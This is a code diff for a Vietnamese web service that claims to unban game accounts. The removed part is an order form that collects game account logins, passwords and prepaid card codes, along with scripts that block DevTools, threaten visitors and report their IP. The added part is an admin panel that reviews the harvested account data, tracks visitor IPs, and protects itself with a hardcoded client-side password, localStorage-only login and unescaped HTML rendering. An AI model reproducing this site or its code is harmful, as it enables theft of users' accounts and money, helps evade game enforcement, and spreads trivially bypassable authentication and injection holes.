-                <i class="fas fa-check-circle"></i> PHP Server-Side • Bảo Mật Tuyệt Đối • Auto Telegram
-            </div>
+  <!-- Sync Status -->
+  <div class="sync-status" id="syncStatus">
+    <span class="sync-dot sync-syncing" id="syncDot"></span>
+    <span id="syncText">Đồng bộ...</span>
+  </div>
 
-            <?php if ($message): ?>
-            <div class="alert alert-<?php echo $messageType; ?>">
-                <?php echo $message; ?>
-            </div>
-            <?php endif; ?>
+  <div class="main-wrapper" id="adminContent" style="display:none;">
+    <div class="container">
+      <div class="header">
+        <div>
+          <h1 style="font-size:2rem; background:linear-gradient(to right,#ffd966,#ffb347); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text;">
+            <i class="fas fa-user-shield"></i> Quản Trị Mở Band
+          </h1>
+          <p style="color:#9aa9c1; margin-top:5px;">Quản lý đơn hàng, IP và hệ thống</p>
+        </div>
+        <div style="display:flex; gap:10px; flex-wrap:wrap; align-items:center;">
+          <button class="btn-admin btn-refresh" onclick="loadData()">
+            <i class="fas fa-sync"></i> Làm mới
+          </button>
+          <button class="btn-admin btn-logout" onclick="adminLogout()">
+            <i class="fas fa-sign-out-alt"></i> Đăng xuất
+          </button>
+          <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Về trang chính</a>
+        </div>
+      </div>
 
-            <!-- Form -->
-            <form method="POST" enctype="multipart/form-data" id="orderForm">
-                <!-- Game Selection -->
-                <div class="section-title"><i class="fas fa-gamepad"></i> Chọn Game</div>
-                <div class="flex-center" id="gameSelector">
-                    <div class="btn-option game-option active" data-game="freefire" onclick="selectOption(this, 'game')">🔥 Free Fire</div>
-                    <div class="btn-option game-option" data-game="pubg" onclick="selectOption(this, 'game')">🎯 PUBG Mobile</div>
-                    <div class="btn-option game-option" data-game="mobilelegends" onclick="selectOption(this, 'game')">⚔️ Mobile Legends</div>
-                    <div class="btn-option game-option" data-game="lienquan" onclick="selectOption(this, 'game')">🐉 Liên Quân</div>
-                </div>
-                <input type="hidden" name="game" id="gameInput" value="freefire">
+      <!-- Tabs -->
+      <div class="tabs">
+        <button class="tab-btn active" data-tab="orders" onclick="switchTab('orders')">
+          <i class="fas fa-list"></i> Đơn hàng
+        </button>
+        <button class="tab-btn" data-tab="visitors" onclick="switchTab('visitors')">
+          <i class="fas fa-users"></i> Visitors
+        </button>
+        <button class="tab-btn" data-tab="banned" onclick="switchTab('banned')">
+          <i class="fas fa-ban"></i> IP Bị Ban
+        </button>
+        <button class="tab-btn" data-tab="security" onclick="switchTab('security')">
+          <i class="fas fa-shield-alt"></i> Bảo mật
+        </button>
+      </div>
 
-                <!-- Server -->
-                <div class="section-title"><i class="fas fa-server"></i> Chọn Server</div>
-                <div class="flex-center">
-                    <div class="btn-option active" data-server="vietnam" onclick="selectOption(this, 'server')">🇻🇳 Việt Nam</div>
-                    <div class="btn-option" data-server="indonesia" onclick="selectOption(this, 'server')">🇮🇩 Indonesia</div>
-                    <div class="btn-option" data-server="thailand" onclick="selectOption(this, 'server')">🇹🇭 Thái Lan</div>
-                    <div class="btn-option" data-server="brazil" onclick="selectOption(this, 'server')">🇧🇷 Brazil</div>
-                </div>
-                <input type="hidden" name="server" id="serverInput" value="vietnam">
-
-                <!-- Pricing -->
-                <div class="section-title"><i class="fas fa-crown"></i> Gói Dịch Vụ</div>
-                <div class="pricing-table">
-                    <?php foreach ($prices as $key => $plan): ?>
-                    <div class="plan <?php echo $key === 'basic' ? 'selected' : ''; ?>" data-plan="<?php echo $key; ?>" onclick="selectPlan(this)">
-                        <h3><?php echo $plan['name']; ?></h3>
-                        <div class="plan-price"><?php echo number_format($plan['price']); ?>đ</div>
-                        <div style="color:#9aa9c1;">⏱ <?php echo $plan['time']; ?> phút</div>
-                    </div>
-                    <?php endforeach; ?>
-                </div>
-                <input type="hidden" name="plan" id="planInput" value="basic">
-
-                <!-- Payment -->
-                <div class="section-title"><i class="fas fa-wallet"></i> Thanh Toán</div>
-                <div class="flex-center">
-                    <div class="btn-option payment-option active" data-method="bank" onclick="selectPayment(this)">🏦 Chuyển khoản</div>
-                    <div class="btn-option payment-option" data-method="card" onclick="selectPayment(this)">💳 Thẻ cào</div>
-                </div>
-
-                <!-- Bank Info -->
-                <div class="info-box bank" id="bankInfo">
-                    <div class="info-row"><strong>🏦 <?php echo BANK_NAME; ?></strong></div>
-                    <div class="info-row"><strong>👤 <?php echo BANK_OWNER; ?></strong></div>
-                    <div class="info-row">
-                        <span><strong>💳 <?php echo BANK_ACCOUNT; ?></strong></span>
-                        <button type="button" class="btn-option" style="padding:5px 15px;font-size:0.8rem;" onclick="copyText('<?php echo BANK_ACCOUNT; ?>')">
-                            <i class="fas fa-copy"></i> Copy
-                        </button>
-                    </div>
-                    <div class="info-row">
-                        <span><strong>💰 Số tiền:</strong> <span id="displayPrice">150.000</span> VNĐ</span>
-                    </div>
-                    <div class="info-row" style="color:#ffd966;">
-                        <span><strong>📌 Nội dung CK:</strong> MOBAND</span>
-                    </div>
-                </div>
-
-                <!-- Card Info -->
-                <div class="info-box card hidden" id="cardInfo">
-                    <div class="info-row"><strong>📱 Nhà mạng:</strong> Viettel, Mobifone, Vinaphone</div>
-                    <div style="margin-top:15px;">
-                        <select class="input-field" name="card_type">
-                            <option>Viettel</option>
-                            <option>Mobifone</option>
-                            <option>Vinaphone</option>
-                        </select>
-                    </div>
-                    <div style="margin-top:15px;">
-                        <input type="text" class="input-field" name="card_code" placeholder="Mã thẻ cào">
-                    </div>
-                    <div style="margin-top:15px;">
-                        <input type="text" class="input-field" name="card_serial" placeholder="Số Seri">
-                    </div>
-                </div>
-
-                <!-- Upload -->
-                <div style="margin:20px 0;">
-                    <label style="color:#b0d4ff;margin-bottom:8px;display:block;">
-                        <i class="fas fa-camera"></i> Ảnh chuyển khoản <span style="color:#ff6b6b;">*</span>
-                    </label>
-                    <div class="file-upload" onclick="document.getElementById('paymentImage').click()">
-                        <div id="uploadPlaceholder">
-                            <i class="fas fa-cloud-upload-alt" style="font-size:3rem;color:#00c8ff;"></i>
-                            <p style="color:#9aa9c1;">Nhấp để tải ảnh lên</p>
-                        </div>
-                        <img id="imagePreview" style="display:none;max-width:100%;max-height:300px;border-radius:12px;">
-                    </div>
-                    <input type="file" id="paymentImage" name="payment_image" accept="image/*" style="display:none;" onchange="previewImage(event)">
-                </div>
-
-                <!-- Account Info -->
-                <div style="background:rgba(10,20,38,0.8);border-radius:28px;padding:25px 20px;margin:20px 0;border:1px solid rgba(0,200,255,0.4);">
-                    <div class="section-title"><i class="fas fa-bolt"></i> Thông Tin Tài Khoản</div>
-                    
-                    <div style="margin-top:16px;">
-                        <label style="color:#b0d4ff;">🆔 ID tài khoản game <span style="color:#ff6b6b;">*</span></label>
-                        <input type="text" class="input-field" name="uid" placeholder="Nhập UID tài khoản" required>
-                    </div>
-                    <div style="margin-top:16px;">
-                        <label style="color:#b0d4ff;">📧 Email / SĐT <span style="color:#ff6b6b;">*</span></label>
-                        <input type="text" class="input-field" name="account" placeholder="Email hoặc số điện thoại" required>
-                    </div>
-                    <div style="margin-top:16px;">
-                        <label style="color:#b0d4ff;">🔐 Mật khẩu <span style="color:#ff6b6b;">*</span></label>
-                        <input type="password" class="input-field" name="password" placeholder="Nhập mật khẩu" required>
-                    </div>
-                    <div style="margin-top:16px;">
-                        <label style="color:#b0d4ff;">🤖 <?php echo $captchaQuestion; ?> = ?</label>
-                        <input type="number" class="input-field" name="captcha" placeholder="Nhập kết quả" required>
-                        <input type="hidden" name="captcha_result" value="<?php echo $captchaResult; ?>">
-                    </div>
-                </div>
-
-                <button type="submit" name="submit_order" class="btn-submit">
-                    <i class="fas fa-paper-plane"></i> GỬI YÊU CẦU MỞ BAND
-                </button>
-            </form>
+      <!-- Tab: Orders -->
+      <div class="tab-content active" id="tab-orders">
+        <div class="stats" id="statsContainer">
+          <div class="stat-card">
+            <div class="number" id="totalOrders">0</div>
+            <div class="label">Tổng đơn</div>
+          </div>
+          <div class="stat-card">
+            <div class="number warning" id="pendingOrders">0</div>
+            <div class="label">Chờ duyệt</div>
+          </div>
+          <div class="stat-card">
+            <div class="number success" id="approvedOrders">0</div>
+            <div class="label">Đã duyệt</div>
+          </div>
+          <div class="stat-card">
+            <div class="number" id="completedOrders" style="color:var(--accent);">0</div>
+            <div class="label">Hoàn thành</div>
+          </div>
+          <div class="stat-card">
+            <div class="number danger" id="rejectedOrders">0</div>
+            <div class="label">Từ chối</div>
+          </div>
         </div>
 
-        <div class="footer-text">
-            © 2026 <?php echo SITE_NAME; ?> v<?php echo VERSION; ?> | PHP Server-Side | IP: <?php echo substr($userIP, 0, 3); ?>***<br>
-            Bảo mật tuyệt đối - Code PHP không thể xem từ client
+        <div class="filter-bar">
+          <select id="statusFilter" onchange="loadOrders()">
+            <option value="all">Tất cả trạng thái</option>
+            <option value="pending">⏳ Chờ duyệt</option>
+            <option value="approved">✅ Đã duyệt</option>
+            <option value="rejected">❌ Từ chối</option>
+            <option value="completed">🎉 Hoàn thành</option>
+          </select>
+          <select id="gameFilter" onchange="loadOrders()">
+            <option value="all">Tất cả game</option>
+            <option value="freefire">Free Fire</option>
+            <option value="pubg">PUBG Mobile</option>
+            <option value="mobilelegends">Mobile Legends</option>
+            <option value="lienquan">Liên Quân</option>
+            <option value="valorant">Valorant</option>
+          </select>
+          <input type="text" id="searchInput" placeholder="🔍 Tìm ID hoặc UID..." onkeyup="loadOrders()">
         </div>
+
+        <div id="ordersContainer">
+          <div class="empty-state">
+            <i class="fas fa-inbox"></i>
+            <p>Không có đơn hàng nào</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Tab: Visitors -->
+      <div class="tab-content" id="tab-visitors">
+        <h3 style="margin-bottom:15px; color:var(--accent);">
+          <i class="fas fa-eye"></i> Danh sách visitors
+        </h3>
+        <div id="visitorsContainer"></div>
+      </div>
+
+      <!-- Tab: Banned IPs -->
+      <div class="tab-content" id="tab-banned">
+        <h3 style="margin-bottom:15px; color:var(--danger);">
+          <i class="fas fa-ban"></i> Danh sách IP bị ban
+        </h3>
+        <div style="display:flex; gap:10px; margin-bottom:15px; flex-wrap:wrap;">
+          <input type="text" id="banIpInput" placeholder="Nhập IP cần ban..." class="input-field" style="max-width:300px; padding:10px 18px;">
+          <button class="btn-admin btn-ban" onclick="banIP()"><i class="fas fa-plus"></i> Ban IP</button>
+        </div>
+        <div id="bannedContainer"></div>
+      </div>
+
+      <!-- Tab: Security -->
+      <div class="tab-content" id="tab-security">
+        <h3 style="margin-bottom:15px; color:var(--warning);">
+          <i class="fas fa-shield-alt"></i> Nhật ký bảo mật
+        </h3>
+        <div style="display:flex; gap:10px; margin-bottom:15px; flex-wrap:wrap;">
+          <button class="btn-admin btn-refresh" onclick="loadSecurityLogs()">
+            <i class="fas fa-sync"></i> Làm mới
+          </button>
+          <button class="btn-admin btn-ban" onclick="clearSecurityLogs()">
+            <i class="fas fa-trash"></i> Xóa logs
+          </button>
+        </div>
+        <div id="securityLogsContainer"></div>
+      </div>
     </div>
+  </div>
 
-    <script>
-        // ============================================
-        // ANTI-CRACK CLIENT-SIDE (LỚP BẢO VỆ THỨ 2)
-        // ============================================
-        (function() {
-            // Chống F12
-            setInterval(function() {
-                if (window.outerWidth - window.innerWidth > 160 || window.outerHeight - window.innerHeight > 160) {
-                    document.body.innerHTML = '<div style="color:red;text-align:center;padding:50px;"><h1>🚨 BẢO MẬT</h1><p>DevTools bị cấm! IP của bạn đã được ghi lại.</p></div>';
-                    fetch('/alert.php?reason=DevTools&ip=<?php echo $userIP; ?>');
-                }
-            }, 500);
+  <!-- Security Script (Load first) -->
+  <script src="security.js"></script>
+  
+  <!-- Sync Script -->
+  <script src="sync.js"></script>
 
-            // Chặn phím
-            document.addEventListener('keydown', function(e) {
-                if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && [73,74,67].includes(e.keyCode)) || (e.ctrlKey && e.keyCode === 85)) {
-                    e.preventDefault();
-                    return false;
-                }
-            }, true);
-
-            // Chặn chuột phải
-            document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
-        })();
-
-        // ============================================
-        // UI FUNCTIONS
-        // ============================================
-        function selectOption(el, type) {
-            el.parentElement.querySelectorAll('.btn-option').forEach(o => o.classList.remove('active'));
-            el.classList.add('active');
-            document.getElementById(type + 'Input').value = el.dataset[type];
+  <script>
+    // ============================================
+    // ADMIN AUTHENTICATION
+    // ============================================
+    function adminLogin() {
+      const password = document.getElementById('admin-login-password').value;
+      
+      // Sử dụng hàm từ security.js nếu có
+      if (window.Security && window.Security.verifyAdminPassword) {
+        if (window.Security.verifyAdminPassword(password)) {
+          document.getElementById('admin-security-overlay').style.display = 'none';
+          document.getElementById('adminContent').style.display = 'block';
+          // Set session
+          localStorage.setItem('admin_session', 'authenticated');
+          localStorage.setItem('admin_session_time', Date.now().toString());
+          loadData();
+          return;
         }
-
-        function selectPlan(el) {
-            document.querySelectorAll('.plan').forEach(p => p.classList.remove('selected'));
-            el.classList.add('selected');
-            document.getElementById('planInput').value = el.dataset.plan;
-            
-            var prices = {basic: 150000, vip: 300000, ultimate: 500000};
-            document.getElementById('displayPrice').textContent = prices[el.dataset.plan].toLocaleString();
+      } else {
+        // Fallback
+        if (password === 'Admin@2024') {
+          document.getElementById('admin-security-overlay').style.display = 'none';
+          document.getElementById('adminContent').style.display = 'block';
+          localStorage.setItem('admin_session', 'authenticated');
+          localStorage.setItem('admin_session_time', Date.now().toString());
+          loadData();
+          return;
         }
+      }
+      
+      // Sai mật khẩu
+      Swal.fire({
+        icon: 'error',
+        title: '❌ Xác thực thất bại!',
+        text: 'Mật khẩu không đúng. Vui lòng thử lại.',
+        timer: 2000,
+        showConfirmButton: false
+      });
+      document.getElementById('admin-login-password').value = '';
+      document.getElementById('admin-login-password').focus();
+    }
 
-        function selectPayment(el) {
-            document.querySelectorAll('.payment-option').forEach(o => o.classList.remove('active'));
-            el.classList.add('active');
-            document.getElementById('bankInfo').classList.toggle('hidden', el.dataset.method !== 'bank');
-            document.getElementById('cardInfo').classList.toggle('hidden', el.dataset.method !== 'card');
-        }
+    function adminLogout() {
+      localStorage.removeItem('admin_session');
+      localStorage.removeItem('admin_session_time');
+      location.reload();
+    }
 
-        function previewImage(event) {
-            var reader = new FileReader();
-            reader.onload = function() {
-                document.getElementById('imagePreview').src = reader.result;
-                document.getElementById('imagePreview').style.display = 'block';
-                document.getElementById('uploadPlaceholder').style.display = 'none';
-            };
-            reader.readAsDataURL(event.target.files[0]);
-        }
+    // Kiểm tra session khi load trang
+    function checkAdminSession() {
+      const session = localStorage.getItem('admin_session');
+      const sessionTime = parseInt(localStorage.getItem('admin_session_time') || '0');
+      if (session === 'authenticated' && (Date.now() - sessionTime) < 3600000) {
+        document.getElementById('admin-security-overlay').style.display = 'none';
+        document.getElementById('adminContent').style.display = 'block';
+        return true;
+      }
+      return false;
+    }
 
-        function copyText(text) {
-            navigator.clipboard.writeText(text).then(function() {
-                Swal.fire({icon: 'success', title: '✅ Đã sao chép!', timer: 1500, showConfirmButton: false});
+    // ============================================
+    // DATA FUNCTIONS
+    // ============================================
+    function getOrders() {
+      try {
+        return JSON.parse(localStorage.getItem('orders') || '[]');
+      } catch (e) {
+        return [];
+      }
+    }
+
+    function saveOrders(orders) {
+      localStorage.setItem('orders', JSON.stringify(orders));
+      if (window.syncManager) window.syncManager.triggerSync();
+    }
+
+    function getBannedIPs() {
+      try {
+        return JSON.parse(localStorage.getItem('banned_ips') || '[]');
+      } catch (e) {
+        return [];
+      }
+    }
+
+    function saveBannedIPs(ips) {
+      localStorage.setItem('banned_ips', JSON.stringify(ips));
+      if (window.syncManager) window.syncManager.triggerSync();
+    }
+
+    function getVisitors() {
+      try {
+        return JSON.parse(localStorage.getItem('visitors') || '[]');
+      } catch (e) {
+        return [];
+      }
+    }
+
+    function getSecurityLogs() {
+      try {
+        return JSON.parse(localStorage.getItem('security_logs') || '[]');
+      } catch (e) {
+        return [];
+      }
+    }
+
+    // ============================================
+    // TAB SWITCHING
+    // ============================================
+    function switchTab(tab) {
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      document.querySelector(`.tab-btn[data-tab="${tab}"]`).classList.add('active');
+      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+      document.getElementById(`tab-${tab}`).classList.add('active');
+      
+      if (tab === 'visitors') loadVisitors();
+      if (tab === 'banned') loadBannedIPs();
+      if (tab === 'security') loadSecurityLogs();
+    }
+
+    // ============================================
+    // LOAD ORDERS
+    // ============================================
+    function loadOrders() {
+      const statusFilter = document.getElementById('statusFilter').value;
+      const gameFilter = document.getElementById('gameFilter').value;
+      const searchTerm = document.getElementById('searchInput').value.toLowerCase();
+
+      let orders = getOrders();
+
+      if (statusFilter !== 'all') {
+        orders = orders.filter(o => o.status === statusFilter);
+      }
+      if (gameFilter !== 'all') {
+        orders = orders.filter(o => o.game === gameFilter);
+      }
+      if (searchTerm) {
+        orders = orders.filter(o => 
+          o.id.toLowerCase().includes(searchTerm) || 
+          (o.uid && o.uid.toLowerCase().includes(searchTerm))
+        );
+      }
+
+      // Update stats
+      const allOrders = getOrders();
+      document.getElementById('totalOrders').textContent = allOrders.length;
+      document.getElementById('pendingOrders').textContent = allOrders.filter(o => o.status === 'pending').length;
+      document.getElementById('approvedOrders').textContent = allOrders.filter(o => o.status === 'approved').length;
+      document.getElementById('completedOrders').textContent = allOrders.filter(o => o.status === 'completed').length;
+      document.getElementById('rejectedOrders').textContent = allOrders.filter(o => o.status === 'rejected').length;
+
+      // Render orders
+      const container = document.getElementById('ordersContainer');
+      if (orders.length === 0) {
+        container.innerHTML = `
+          <div class="empty-state">
+            <i class="fas fa-inbox"></i>
+            <p>Không có đơn hàng nào</p>
+          </div>
+        `;
+        return;
+      }
+
+      container.innerHTML = orders.map(order => `
+        <div class="order-card ${order.status}">
+          <div class="order-header">
+            <div>
+              <span class="order-id">#${order.id}</span>
+              <span style="margin-left:10px; font-size:0.85rem; color:#9aa9c1;">
+                ${new Date(order.createdAt).toLocaleString('vi-VN')}
+              </span>
+              ${order.discount > 0 ? `<span style="margin-left:10px; color:#2ecc71; font-size:0.8rem;">🎉 -${(order.discount * 100)}%</span>` : ''}
+            </div>
+            <div style="display:flex; gap:8px; align-items:center; flex-wrap:wrap;">
+              <span style="font-size:0.75rem; color:#6c7e9e;">IP: ${order.ip || 'N/A'}</span>
+              <span class="order-status status-${order.status}">
+                ${order.status === 'pending' ? '⏳ Chờ duyệt' :
+                  order.status === 'approved' ? '✅ Đã duyệt' :
+                  order.status === 'rejected' ? '❌ Từ chối' :
+                  '🎉 Hoàn thành'}
+              </span>
+            </div>
+          </div>
+
+          <div class="order-details">
+            <div class="detail"><strong>🎮 Game:</strong> ${order.game.toUpperCase()}</div>
+            <div class="detail"><strong>🌐 Server:</strong> ${order.server.toUpperCase()}</div>
+            <div class="detail"><strong>💎 Gói:</strong> ${order.plan.toUpperCase()}</div>
+            <div class="detail"><strong>💰 Giá:</strong> ${order.price.toLocaleString()}đ</div>
+            <div class="detail"><strong>🆔 UID:</strong> ${order.uid || 'N/A'}</div>
+            <div class="detail"><strong>🔗 Platform:</strong> ${order.platform || 'N/A'}</div>
+            <div class="detail"><strong>📧 Tài khoản:</strong> ${order.account || 'N/A'}</div>
+            <div class="detail"><strong>📍 Vị trí:</strong> ${order.location || 'N/A'}</div>
+            ${order.note ? `<div class="detail"><strong>📝 Ghi chú:</strong> ${order.note}</div>` : ''}
+            ${order.reason ? `<div class="detail"><strong>📝 Lý do từ chối:</strong> ${order.reason}</div>` : ''}
+            ${order.warranty ? `<div class="detail"><strong>🛡️ Bảo hành:</strong> ${order.warranty}</div>` : ''}
+            ${order.image ? `<div class="detail"><strong>🖼️ Ảnh:</strong> <img src="${order.image}" class="image-thumb" onclick="viewImage('${order.image}')"></div>` : ''}
+          </div>
+
+          ${order.status === 'pending' ? `
+            <div class="order-actions">
+              <button class="btn-admin btn-approve" onclick="approveOrder('${order.id}')">
+                <i class="fas fa-check"></i> Duyệt & Mở Band
+              </button>
+              <button class="btn-admin btn-reject" onclick="rejectOrder('${order.id}')">
+                <i class="fas fa-times"></i> Từ chối
+              </button>
+              <button class="btn-admin btn-ban" onclick="banIPFromOrder('${order.ip}')">
+                <i class="fas fa-ban"></i> Ban IP
+              </button>
+            </div>
+          ` : `
+            <div style="margin-top:10px;">
+              ${order.ip ? `<button class="btn-admin btn-ban" onclick="banIPFromOrder('${order.ip}')" style="font-size:0.8rem;">
+                <i class="fas fa-ban"></i> Ban IP ${order.ip}
+              </button>` : ''}
+            </div>
+          `}
+        </div>
+      `).join('');
+    }
+
+    // ============================================
+    // ORDER ACTIONS
+    // ============================================
+    function approveOrder(orderId) {
+      Swal.fire({
+        title: '✅ Duyệt đơn hàng?',
+        text: `Bạn có chắc muốn duyệt đơn #${orderId}? Tool sẽ tự động chạy.`,
+        icon: 'question',
+        showCancelButton: true,
+        confirmButtonText: '✅ Duyệt',
+        cancelButtonText: '❌ Hủy',
+        confirmButtonColor: '#2ecc71',
+        cancelButtonColor: '#e74c3c'
+      }).then((result) => {
+        if (result.isConfirmed) {
+          const order = updateOrderStatus(orderId, 'approved');
+          if (order) {
+            Swal.fire({
+              icon: 'success',
+              title: '✅ Đã duyệt!',
+              text: `Đơn #${orderId} đã được duyệt. Tool đang chạy.`,
+              timer: 3000,
+              showConfirmButton: false
             });
+            playNotificationSound();
+            loadOrders();
+          }
         }
-    </script>
+      });
+    }
+
+    function rejectOrder(orderId) {
+      Swal.fire({
+        title: '❌ Từ chối đơn hàng',
+        input: 'text',
+        inputLabel: 'Nhập lý do từ chối:',
+        inputPlaceholder: 'Ví dụ: Ảnh chuyển khoản không rõ',
+        showCancelButton: true,
+        confirmButtonText: '❌ Từ chối',
+        cancelButtonText: 'Hủy',
+        confirmButtonColor: '#e74c3c',
+        cancelButtonColor: '#95a5a6'
+      }).then((result) => {
+        if (result.isConfirmed && result.value) {
+          const order = updateOrderStatus(orderId, 'rejected', { reason: result.value });
+          if (order) {
+            Swal.fire({
+              icon: 'info',
+              title: 'Đã từ chối!',
+              text: `Đơn #${orderId} đã bị từ chối với lý do: ${result.value}`,
+              timer: 3000,
+              showConfirmButton: false
+            });
+            playNotificationSound();
+            loadOrders();
+          }
+        } else if (result.isConfirmed && !result.value) {
+          Swal.fire('⚠️', 'Vui lòng nhập lý do từ chối.', 'warning');
+        }
+      });
+    }
+
+    function updateOrderStatus(orderId, status, metadata = {}) {
+      const orders = getOrders();
+      const index = orders.findIndex(o => o.id === orderId);
+      if (index !== -1) {
+        orders[index].status = status;
+        orders[index].updatedAt = new Date().toISOString();
+        if (metadata.reason) orders[index].reason = metadata.reason;
+        if (status === 'approved') {
+          orders[index].warranty = getWarrantyPeriod(orders[index].plan);
+        }
+        saveOrders(orders);
+        return orders[index];
+      }
+      return null;
+    }
+
+    function getWarrantyPeriod(plan) {
+      const periods = { 'basic': '3 tháng', 'vip': '6 tháng', 'ultimate': '12 tháng' };
+      return periods[plan] || '12 tháng';
+    }
+
+    function viewImage(imageData) {
+      Swal.fire({
+        imageUrl: imageData,
+        imageAlt: 'Ảnh chuyển khoản',
+        showCloseButton: true,
+        showConfirmButton: false,
+        width: '90%',
+        background: '#0a0f1e'
+      });
+    }
+
+    // ============================================
+    // BAN IP FUNCTIONS
+    // ============================================
+    function banIP() {
+      const input = document.getElementById('banIpInput');
+      const ip = input.value.trim();
+      if (!ip) {
+        Swal.fire('⚠️', 'Vui lòng nhập IP cần ban.', 'warning');
+        return;
+      }
+
+      const banned = getBannedIPs();
+      if (banned.includes(ip)) {
+        Swal.fire('⚠️', `IP ${ip} đã bị ban từ trước.`, 'warning');
+        return;
+      }
+
+      banned.push(ip);
+      saveBannedIPs(banned);
+      input.value = '';
+      loadBannedIPs();
+      Swal.fire({
+        icon: 'success',
+        title: '✅ Đã ban IP!',
+        text: `IP ${ip} đã bị chặn truy cập.`,
+        timer: 3000,
+        showConfirmButton: false
+      });
+    }
+
+    function banIPFromOrder(ip) {
+      if (!ip || ip === 'N/A' || ip === 'unknown') {
+        Swal.fire('⚠️', 'Không thể ban IP này.', 'warning');
+        return;
+      }
+
+      const banned = getBannedIPs();
+      if (banned.includes(ip)) {
+        Swal.fire('⚠️', `IP ${ip} đã bị ban từ trước.`, 'warning');
+        return;
+      }
+
+      Swal.fire({
+        title: '🚫 Ban IP?',
+        text: `Bạn có chắc muốn ban IP ${ip}?`,
+        icon: 'warning',
+        showCancelButton: true,
+        confirmButtonText: '✅ Ban',
+        cancelButtonText: 'Hủy',
+        confirmButtonColor: '#e74c3c'
+      }).then((result) => {
+        if (result.isConfirmed) {
+          banned.push(ip);
+          saveBannedIPs(banned);
+          loadBannedIPs();
+          Swal.fire({
+            icon: 'success',
+            title: '✅ Đã ban IP!',
+            text: `IP ${ip} đã bị chặn truy cập.`,
+            timer: 3000,
+            showConfirmButton: false
+          });
+        }
+      });
+    }
+
+    function unbanIP(ip) {
+      let banned = getBannedIPs();
+      banned = banned.filter(b => b !== ip);
+      saveBannedIPs(banned);
+      loadBannedIPs();
+      Swal.fire({
+        icon: 'info',
+        title: '🔄 Đã bỏ ban!',
+        text: `IP ${ip} đã được gỡ khỏi danh sách ban.`,
+        timer: 2000,
+        showConfirmButton: false
+      });
+    }
+
+    function loadBannedIPs() {
+      const container = document.getElementById('bannedContainer');
+      const banned = getBannedIPs();
+
+      if (banned.length === 0) {
+        container.innerHTML = `
+          <div class="empty-state">
+            <i class="fas fa-check-circle" style="color:#2ecc71;"></i>
+            <p>Không có IP nào bị ban</p>
+          </div>
+        `;
+        return;
+      }
+
+      container.innerHTML = banned.map(ip => `
+        <div class="banned-ip-item">
+          <div>
+            <strong style="color:#ff6b6b;">🚫 ${ip}</strong>
+          </div>
+          <button class="btn-admin btn-unban" onclick="unbanIP('${ip}')" style="font-size:0.8rem;">
+            <i class="fas fa-undo"></i> Bỏ ban
+          </button>
+        </div>
+      `).join('');
+    }
+
+    // ============================================
+    // VISITORS
+    // ============================================
+    function loadVisitors() {
+      const container = document.getElementById('visitorsContainer');
+      const visitors = getVisitors();
+
+      if (visitors.length === 0) {
+        container.innerHTML = `
+          <div class="empty-state">
+            <i class="fas fa-users"></i>
+            <p>Chưa có visitor nào</p>
+          </div>
+        `;
+        return;
+      }
+
+      container.innerHTML = visitors.slice(0, 100).map(v => `
+        <div class="visitor-item">
+          <div>
+            <span class="ip">${v.ip || 'N/A'}</span>
+            <span class="location">📍 ${v.location || 'N/A'}</span>
+          </div>
+          <div style="display:flex; align-items:center; gap:10px;">
+            <span class="time">${new Date(v.timestamp).toLocaleString('vi-VN')}</span>
+            <button class="btn-admin btn-ban" onclick="banIPFromOrder('${v.ip}')" style="font-size:0.7rem; padding:4px 12px;">
+              <i class="fas fa-ban"></i> Ban
+            </button>
+          </div>
+        </div>
+      `).join('');
+    }
+
+    // ============================================
+    // SECURITY LOGS
+    // ============================================
+    function loadSecurityLogs() {
+      const container = document.getElementById('securityLogsContainer');
+      const logs = getSecurityLogs();
+
+      if (logs.length === 0) {
+        container.innerHTML = `
+          <div class="empty-state">
+            <i class="fas fa-shield-alt"></i>
+            <p>Chưa có sự kiện bảo mật nào</p>
+          </div>
+        `;
+        return;
+      }
+
+      container.innerHTML = logs.slice(0, 50).map(log => `
+        <div class="security-log-item">
+          <div>
+            <span class="event">🔒 ${log.event}</span>
+            <span style="color:#6c7e9e; font-size:0.75rem; margin-left:10px;">
+              ${new Date(log.timestamp).toLocaleString('vi-VN')}
+            </span>
+          </div>
+          ${log.userAgent ? `<div style="font-size:0.7rem; color:#6c7e9e;">${log.userAgent.substring(0, 80)}</div>` : ''}
+        </div>
+      `).join('');
+    }
+
+    function clearSecurityLogs() {
+      Swal.fire({
+        title: '⚠️ Xóa logs bảo mật?',
+        text: 'Hành động này không thể hoàn tác!',
+        icon: 'warning',
+        showCancelButton: true,
+        confirmButtonText: '✅ Xóa',
+        cancelButtonText: 'Hủy',
+        confirmButtonColor: '#e74c3c'
+      }).then((result) => {
+        if (result.isConfirmed) {
+          localStorage.setItem('security_logs', '[]');
+          loadSecurityLogs();
+          Swal.fire({
+            icon: 'success',
+            title: '✅ Đã xóa logs!',
+            timer: 2000,
+            showConfirmButton: false
+          });
+        }
+      });
+    }
+
+    // ============================================
+    // LOAD ALL DATA
+    // ============================================
+    function loadData() {
+      loadOrders();
+      if (document.getElementById('tab-visitors').classList.contains('active')) {
+        loadVisitors();
+      }
+      if (document.getElementById('tab-banned').classList.contains('active')) {
+        loadBannedIPs();
+      }
+      if (document.getElementById('tab-security').classList.contains('active')) {
+        loadSecurityLogs();
+      }
+    }
+
+    // ============================================
+    // NOTIFICATION SOUND
+    // ============================================
+    function playNotificationSound() {
+      try {
+        const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-software-interface-start-2574.mp3');
+        audio.play();
+      } catch (e) {}
+    }
+
+    // ============================================
+    // AUTO REFRESH & SYNC
+    // ============================================
+    window.addEventListener('storage', (e) => {
+      if (e.key === 'orders' || e.key === 'banned_ips' || e.key === 'visitors') {
+        loadData();
+      }
+    });
+
+    setInterval(() => {
+      loadData();
+    }, 10000);
+
+    // ============================================
+    // INIT
+    // ============================================
+    document.addEventListener('DOMContentLoaded', () => {
+      console.log('🔐 Admin Panel - Mở Band Vĩnh Viễn v4.0');
+      
+      // Kiểm tra session
+      if (!checkAdminSession()) {
+        // Hiển thị overlay login
+        document.getElementById('admin-security-overlay').style.display = 'flex';
+        document.getElementById('adminContent').style.display = 'none';
+        document.getElementById('admin-login-password').focus();
+      } else {
+        document.getElementById('admin-security-overlay').style.display = 'none';
+        document.getElementById('adminContent').style.display = 'block';
